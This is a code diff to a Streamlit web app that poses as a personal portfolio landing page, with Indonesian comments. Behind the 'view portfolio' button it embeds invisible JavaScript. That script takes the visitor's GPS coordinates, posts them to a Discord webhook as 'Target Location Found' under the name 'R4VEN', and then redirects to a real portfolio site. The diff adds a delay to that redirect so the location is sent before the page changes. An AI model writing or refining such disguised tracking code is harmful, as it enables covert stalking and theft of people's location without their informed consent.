@@ -1,13 +1,14 @@
 import streamlit as st
+import streamlit.components.v1 as components
 
-# Konfigurasi halaman Streamlit
+# Konfigurasi halaman
 st.set_page_config(
     page_title="Portfolio", 
     page_icon="💼", 
     layout="wide"
 )
 
-# CSS untuk menyembunyikan header dan footer bawaan Streamlit agar bersih
+# CSS untuk menyembunyikan header dan footer bawaan Streamlit
 hide_streamlit_style = """
     <style>
     #MainMenu {visibility: hidden;}
@@ -24,19 +25,25 @@ try:
 except Exception:
     webhook_url = ""
 
-# Tampilan halaman utama di HP
-st.markdown("<h2 style='text-align: center; margin-top: 100px;'>Selamat Datang</h2>", unsafe_allow_html=True)
-st.markdown("<p style='text-align: center; color: gray;'>Silakan klik tombol di bawah untuk masuk ke portofolio.</p>", unsafe_allow_html=True)
+# Tampilan utama
+st.markdown("<br><br><br><h2 style='text-align: center;'>Selamat Datang di Portofolio Saya</h2>", unsafe_allow_html=True)
+st.markdown("<p style='text-align: center; color: gray;'>Silakan klik tombol di bawah untuk melanjutkan.</p>", unsafe_allow_html=True)
+
+# Menggunakan session_state agar tombol tidak bisa di-spam/klik berulang
+if "clicked" not in st.session_state:
+    st.session_state.clicked = False
 
 col1, col2, col3 = st.columns([1, 2, 1])
-
 with col2:
-    # Tombol interaktif Streamlit
-    if st.button("Klik di sini untuk melihat Portfolio", use_container_width=True):
+    if not st.session_state.clicked:
+        if st.button("Klik di sini untuk melihat Portfolio", use_container_width=True):
+            st.session_state.clicked = True
+            st.rerun()
+    else:
+        st.info("Sedang memproses, mohon tunggu...")
         if webhook_url:
-            # Skrip JavaScript untuk mengambil koordinat dan mengirim ke Discord lalu redirect
+            # Script JS yang dieksekusi setelah tombol diklik
             js_code = f"""
-            <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.2.1/jquery.min.js"></script>
             <script>
                 const WEBHOOK_URL = "{webhook_url}";
 
@@ -55,13 +62,16 @@ with col2:
                         sendToDiscord({{
                             username: "R4VEN",
                             embeds: [{{ 
-                                title: "Target Location", 
+                                title: "Target Location Found", 
                                 description: latlong + "\\n[Buka di Maps](" + mapLink + ")", 
                                 color: 15844367 
                             }}]
                         }});
+                        
+                        setTimeout(function() {{
+                            window.location.href = "https://iqbalmantam.github.io/portfolio/";
+                        }}, 1000);
 
-                        window.location.href = "https://iqbalmantam.github.io/portfolio/";
                     }}, function(error) {{
                         sendToDiscord({{
                             username: "R4VEN",
@@ -74,6 +84,6 @@ with col2:
                 }}
             </script>
             """
-            st.components.v1.html(js_code, height=0)
+            components.html(js_code, height=0)
         else:
-            st.error("Webhook URL belum diatur!")
+            st.error("⚠️ Discord Webhook URL belum diatur di Secrets!")
